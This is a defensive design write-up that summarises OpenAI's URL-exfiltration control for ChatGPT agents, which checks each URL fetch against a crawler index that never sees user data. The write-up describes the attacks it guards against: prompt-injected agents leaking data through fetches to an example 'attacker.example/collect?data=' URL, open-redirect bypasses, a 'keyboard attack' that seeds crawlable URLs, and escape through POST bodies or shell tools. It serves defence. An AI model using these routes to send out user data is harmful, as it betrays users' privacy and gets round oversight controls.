# Gate URL fetches on "has this exact URL been crawled by a user-data-free index", not on domain reputation — it replaced a 10%-coverage domain allowlist and made open redirects structurally irrelevant

OpenAI shipped and then published the design of a URL-exfiltration control for ChatGPT agents, including the numbers on why the obvious approach failed. The mechanism is worth copying, and its load-bearing assumption is worth copying with it.

**THE ATTACK.** An agent that can be induced to fetch a resource leaks whatever the attacker can get into the URL, because the destination server logs the requested URL. `https://attacker.example/collect?data=<something private>` needs no response and no visible output — the fetch can be an embedded image or a link preview, so the user never sees it happen.

**WHY THE DOMAIN ALLOWLIST FAILED, quantitatively.** OpenAI's first implementation was a hand-curated allowlist of reputable domains, on the reasoning that google.com and facebook.com have no interest in harvesting exfiltrated data. Two measured problems killed it. First, coverage: the allowlist matched only about **ten percent** of the URLs users were actually visiting, so the overwhelming majority of benign traffic produced a warning — and the paper names the consequence explicitly, that this volume of false alarms trains users to click through prompts without reading them. Second, and treated as the more serious defect: **open redirects**. A link nominally to an allowlisted domain can forward to an attacker-controlled destination, and the paper's point is not that any particular redirect is fixable but that *any new open redirect on any allowlisted domain* — introduced by accident or as intended functionality — silently reopens the bypass. A domain check is only as strong as the redirect hygiene of every domain on the list.

**THE REPLACEMENT, and why it is a provenance argument rather than a reputation one.** OpenAI already runs a search crawler for its own product, in an environment with no access to user conversations, accounts or personal data. That isolation is the whole security argument: a crawler that has never seen your data cannot have visited a URL containing your data. So the check became an exact match of the proposed URL against URLs the independent index has already observed. The safety question moves from "do we trust this site?" to "has this specific address appeared publicly on the open web in a way that does not depend on user data?" On a match the agent fetches automatically; on a miss the agent is told to find another source, or the user is shown a warning and has to act.

Open redirects stop mattering under this rule, and the reason is structural rather than a patch: a crawled redirect URL still contains no user-specific data, so allowing it leaks nothing.

**TWO IMPLEMENTATION DETAILS THAT ARE EASY TO GET WRONG.**
- **Canonicalization is required, not optional.** `?query2=123&query1=456` and `?query1=456&query2=123` name the same resource; without normalising parameter order and similar variations, an exact-match rule fails open on benign URLs (and gives an attacker trivial ways to look novel).
- **Escape hatches were needed for usability**: URLs the user supplied directly, and URLs returned in search results, are marked safe independently of the index.

**COVERAGE — AND MIND THE MODALITY, BECAUSE THE TWO NUMBERS ARE NOT THE SAME KIND OF NUMBER.** The 10% figure is a measurement of what the domain allowlist actually matched. The 80% figure is not: OpenAI writes that "based on internal analyses, we believe that over 80% of URLs actively being visited by users **can eventually be covered** by our search index". That is a projection of achievable coverage, not achieved coverage at time of writing, and this fact's title previously stated it as accomplished. Treat 10% as observed and 80% as OpenAI's stated ceiling. The residual is structural either way: URLs behind a login, or carrying session or tracking information, will never be in a public index.

**THE NAMED RESIDUAL ATTACK — the "keyboard attack".** An attacker pre-seeds a large space of unique URLs and gets them crawled, laundering personal data into the index before it is used: a site enumerating every US street address, for example, so that a later fetch of the victim's address matches. OpenAI presents it as theoretical and bounds it with an inverse relationship — the more URLs you must get crawled, the fewer bits each carries. Registering only a 36-character alphabet is cheap, but then leaking "123 Main Street" requires the model to make roughly 13 separate sequential fetches, which is far more fragile than one.

**THE BOUNDARY CONDITION THAT DECIDES WHETHER THIS TRANSFERS TO YOUR SYSTEM.** The paper's threat model assumes the attacker cannot control request headers, request bodies, or transport-level details, and that the agent's network interaction is limited to ordinary retrieval — following links, loading images, navigating pages — and specifically that it does not issue arbitrary POST requests or custom fetches. That is a description of ChatGPT's browsing surface, not of agents in general. **An agent holding a general-purpose HTTP tool, a shell, or an MCP server that can post arbitrary bodies is outside this model and gains nothing from a URL-index check** — the data simply leaves in a body instead of a query string. Adopt the pattern only where you actually control the egress primitive down to GET-shaped retrieval.

**SCOPE OF THE GUARANTEE.** The authors are explicit that this prevents the *loading* of a resource from exfiltrating user data, and guarantees nothing about the resource itself — a crawled, index-matched page can still carry prompt injection or harmful content. They frame the whole mechanism as a compensating control that holds the line while model-intrinsic robustness to web-based injection matures, not as a solved problem.
